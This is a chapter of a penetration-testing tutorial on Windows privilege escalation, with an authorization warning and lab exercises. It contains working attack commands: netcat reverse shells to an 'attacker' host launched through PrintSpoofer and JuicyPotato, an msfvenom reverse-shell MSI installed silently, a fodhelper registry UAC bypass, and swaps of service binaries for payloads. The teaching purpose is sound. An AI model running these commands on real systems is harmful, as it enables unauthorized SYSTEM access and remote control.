# Privilege Escalation — Windows

**Previous**: [12. Privilege Escalation — Linux](./12_Privilege_Escalation_Linux.md) | **Next**: [14. Active Directory Attacks](./14_Active_Directory.md)

---

Windows privilege escalation presents unique challenges and opportunities compared to Linux. The Windows security model, with its complex permission system, service architecture, and registry-based configuration, offers numerous escalation vectors that penetration testers must understand and enumerate systematically.

> **IMPORTANT**: Only practice on systems you own or have explicit authorization to test.

**Difficulty**: ⭐⭐⭐⭐

## Learning Objectives

1. Understand the Windows access token and privilege model
2. Exploit token impersonation vulnerabilities (SeImpersonate)
3. Identify and exploit vulnerable Windows services
4. Bypass User Account Control (UAC)
5. Exploit DLL search order hijacking
6. Find and exploit unquoted service paths
7. Use WinPEAS and other enumeration tools effectively
8. Chain multiple weaknesses for SYSTEM access

---

## Table of Contents

1. [Windows Privilege Model](#1-windows-privilege-model)
2. [Token Impersonation (Potato Attacks)](#2-token-impersonation-potato-attacks)
3. [Service Exploitation](#3-service-exploitation)
4. [UAC Bypass Techniques](#4-uac-bypass-techniques)
5. [DLL Hijacking](#5-dll-hijacking)
6. [Unquoted Service Paths](#6-unquoted-service-paths)
7. [AlwaysInstallElevated](#7-alwaysinstallelevated)
8. [Registry Autoruns](#8-registry-autoruns)
9. [Scheduled Tasks](#9-scheduled-tasks)
10. [Windows Enumeration Automation](#10-windows-enumeration-automation)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. Windows Privilege Model

### 1.1 Access Tokens and Privileges

Windows uses access tokens to track user identity and privileges. Key privileges for escalation:

| Privilege | Description | Exploitation |
|-----------|-------------|-------------|
| SeImpersonatePrivilege | Impersonate client tokens | Potato attacks |
| SeAssignPrimaryTokenPrivilege | Assign process tokens | Token manipulation |
| SeBackupPrivilege | Read any file | SAM/SYSTEM extraction |
| SeRestorePrivilege | Write any file | DLL hijacking |
| SeDebugPrivilege | Debug any process | Process injection |
| SeTakeOwnershipPrivilege | Take file ownership | ACL manipulation |
| SeLoadDriverPrivilege | Load kernel drivers | Driver exploitation |

### 1.2 Enumeration Commands

```powershell
# Current user and privileges
whoami /all
whoami /priv

# System information
systeminfo
hostname

# Users and groups
net user
net localgroup administrators

# Running services
sc query state= all
wmic service list full

# Installed patches
wmic qfe list

# Network information
ipconfig /all
netstat -ano
```

---

## 2. Token Impersonation (Potato Attacks)

When a service account has SeImpersonatePrivilege, it can impersonate SYSTEM tokens.

### 2.1 Potato Family

| Tool | Technique | Target |
|------|-----------|--------|
| JuicyPotato | COM server impersonation | Windows Server 2008-2016 |
| RoguePotato | Remote DCOM activation | Windows 10/Server 2019 |
| PrintSpoofer | Print spooler impersonation | Windows 10/Server 2016-2019 |
| GodPotato | Multiple techniques | Wide coverage |
| SweetPotato | Combined techniques | Modern Windows |

```bash
# PrintSpoofer (if SeImpersonatePrivilege available)
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -i -c "C:\temp\nc.exe attacker 4444 -e cmd"

# JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe attacker 4444 -e cmd" -t *
```

---

## 3. Service Exploitation

### 3.1 Insecure Service Permissions

```powershell
# Check service permissions with accesschk
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If we can modify a service:
sc config <service> binpath= "C:\temp\payload.exe"
sc stop <service>
sc start <service>
```

### 3.2 Weak Service Binary Permissions

```powershell
# Check permissions on service binary
icacls "C:\path\to\service.exe"

# If writable, replace with payload
move "C:\path\to\service.exe" "C:\path\to\service.exe.bak"
copy "C:\temp\payload.exe" "C:\path\to\service.exe"
sc stop <service> && sc start <service>
```

---

## 4. UAC Bypass Techniques

User Account Control (UAC) prompts for admin confirmation. Bypass techniques:

```powershell
# Check UAC level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# fodhelper.exe bypass (Windows 10)
# Set registry key then launch fodhelper
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
fodhelper.exe

# UACME tool — collection of 70+ bypass methods
# https://github.com/hfiref0x/UACME
```

---

## 5. DLL Hijacking

Windows DLL search order can be exploited when a program loads a DLL from a writable location:

```
DLL Search Order:
1. Directory of the executable
2. System directory (C:\Windows\System32)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories
```

If we can place a malicious DLL in a higher-priority directory:

```python
"""
DLL hijacking detection module.

Identifies potential DLL hijacking opportunities
by analyzing process DLL loading behavior.
"""

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class DLLHijackOpportunity:
    """A potential DLL hijacking target."""
    process: str
    dll_name: str
    search_path: str
    writable: bool
    severity: str

    def report(self) -> str:
        return (
            f"[{self.severity}] {self.process} loads {self.dll_name}\n"
            f"  Search path: {self.search_path}\n"
            f"  Writable: {self.writable}"
        )


# Common DLL hijacking targets
KNOWN_HIJACK_DLLS = [
    ("chrome.exe", "wer.dll"),
    ("explorer.exe", "cscapi.dll"),
    ("OneDrive.exe", "secur32.dll"),
    ("Teams.exe", "dbghelp.dll"),
]


if __name__ == "__main__":
    print("DLL Hijacking Detection")
    print("=" * 40)
    print("Use Process Monitor (ProcMon) to find:")
    print("  Filter: Result = NAME NOT FOUND")
    print("  Filter: Path ends with .dll")
    print("\nLook for DLLs loaded from writable directories.")
```

---

## 6. Unquoted Service Paths

Windows treats spaces in unquoted paths as potential filename boundaries:

```
# Unquoted path:
C:\Program Files\My App\service.exe

# Windows tries in order:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe

# If we can write to C:\Program Files\My.exe, we get execution
```

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

---

## 7. AlwaysInstallElevated

If both registry keys are set to 1, any MSI package installs with SYSTEM privileges:

```powershell
# Check setting
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi > payload.msi
msiexec /quiet /qn /i payload.msi
```

---

## 8. Registry Autoruns

Programs in autorun registry keys execute at login:

```powershell
# Check autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# If an autorun binary is writable:
# Replace it with payload, wait for next login
```

---

## 9. Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check permissions on task binaries
icacls "C:\path\to\task.exe"

# If binary is writable, replace and wait for execution
```

---

## 10. Windows Enumeration Automation

| Tool | Description | Usage |
|------|-------------|-------|
| WinPEAS | Comprehensive Windows enumeration | `winpeas.exe` |
| PowerUp | PowerShell privesc checks | `Invoke-AllChecks` |
| Seatbelt | .NET security-focused enumeration | `Seatbelt.exe -group=all` |
| SharpUp | .NET port of PowerUp | `SharpUp.exe` |
| PrivescCheck | PowerShell privesc auditor | `Invoke-PrivescCheck` |
| Watson | .NET missing patch finder | `Watson.exe` |

---

## 11. Exercises

1. **Enumeration**: Run WinPEAS on a vulnerable Windows VM and identify all escalation vectors.
2. **Token Impersonation**: Exploit SeImpersonatePrivilege using PrintSpoofer on a service account.
3. **Service Abuse**: Find and exploit a service with weak permissions.
4. **UAC Bypass**: Bypass UAC using the fodhelper technique on Windows 10.
5. **DLL Hijacking**: Use Process Monitor to find a DLL hijacking opportunity and exploit it.
6. **Full Chain**: Complete an HTB/THM Windows machine from initial foothold to SYSTEM.

---

## 12. Summary

Windows privilege escalation requires understanding the Windows security model:

- **Token impersonation** (Potato attacks) exploits SeImpersonatePrivilege
- **Service misconfigurations** provide multiple escalation paths
- **UAC bypass** circumvents the elevation prompt
- **DLL hijacking** exploits the DLL search order
- **Unquoted service paths** trick Windows path parsing
- **Registry settings** like AlwaysInstallElevated grant SYSTEM to MSIs
- **Automated tools** (WinPEAS, PowerUp) accelerate enumeration

---

## 13. References

- HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings Windows PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- LOLBAS: https://lolbas-project.github.io/
- WinPEAS: https://github.com/carlospolop/PEASS-ng
- UACME: https://github.com/hfiref0x/UACME
